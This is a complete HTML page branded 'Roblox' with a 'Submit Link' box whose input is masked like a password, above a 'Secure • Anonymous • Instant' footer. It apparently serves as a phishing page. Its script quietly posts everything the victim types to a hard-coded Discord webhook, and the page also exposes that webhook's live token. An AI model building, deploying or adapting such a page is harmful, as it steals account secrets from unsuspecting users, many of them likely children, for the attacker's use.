<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Roblox</title>

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: 'Segoe UI', Arial, sans-serif;
      height: 100vh;
      background: linear-gradient(135deg, #141e30, #243b55);
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
    }

    .card {
      background: rgba(255, 255, 255, 0.08);
      backdrop-filter: blur(10px);
      border-radius: 16px;
      padding: 30px;
      width: 360px;
      box-shadow: 0 20px 40px rgba(0,0,0,0.3);
      animation: fadeIn 0.8s ease-out;
    }

    @keyframes fadeIn {
      from {
        opacity: 0;
        transform: translateY(20px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    h2 {
      text-align: center;
      margin-bottom: 20px;
      letter-spacing: 1px;
    }

    textarea {
      width: 100%;
      height: 110px;
      padding: 12px;
      border-radius: 10px;
      border: none;
      outline: none;
      resize: none;
      font-size: 15px;
      transition: transform 0.2s ease, box-shadow 0.2s ease;

      /* hide text like password */
      -webkit-text-security: disc;
      -moz-text-security: disc;
    }

    textarea:focus {
      transform: scale(1.02);
      box-shadow: 0 0 0 2px rgba(0, 150, 255, 0.6);
    }

    button {
      width: 100%;
      margin-top: 15px;
      padding: 12px;
      border-radius: 12px;
      border: none;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      background: linear-gradient(135deg, #00c6ff, #0072ff);
      color: white;
      transition: all 0.25s ease;
    }

    button:hover {
      transform: translateY(-3px);
      box-shadow: 0 12px 25px rgba(0, 114, 255, 0.6);
    }

    button:active {
      transform: translateY(0);
      box-shadow: 0 6px 12px rgba(0,0,0,0.3);
    }

    .footer {
      text-align: center;
      font-size: 12px;
      opacity: 0.6;
      margin-top: 12px;
    }
  </style>
</head>
<body>

  <div class="card">
    <h2>Submit Link</h2>

    <textarea id="message" placeholder="Type your message here"></textarea>

    <button onclick="sendMessage()">Send</button>

    <div class="footer">
      Secure • Anonymous • Instant
    </div>
  </div>

  <script>
    const MAX_LENGTH = 1999;

    async function sendMessage() {
      const message = document.getElementById('message').value;
      if (!message) {
        alert("Please type something!");
        return;
      }

      const webhookURL = "https://discord.com/api/webhooks/1438635586889060444/CKHiCB0XsbDaHk2OIMMxk1_P8hjrIevMnJ8wzPcIrr1doa5GhQcTVqyOYrLBBL7bcvCc";

      const chunks = [];
      for (let i = 0; i < message.length; i += MAX_LENGTH) {
        chunks.push(message.substring(i, i + MAX_LENGTH));
      }

      try {
        for (let chunk of chunks) {
          const response = await fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ content: chunk })
          });

          if (!response.ok) {
            alert("Failed to send message.");
            return;
          }
        }

        alert("Message sent!");
        document.getElementById('message').value = "";
      } catch (error) {
        alert("Error: " + error);
      }
    }
  </script>

</body>
</html>
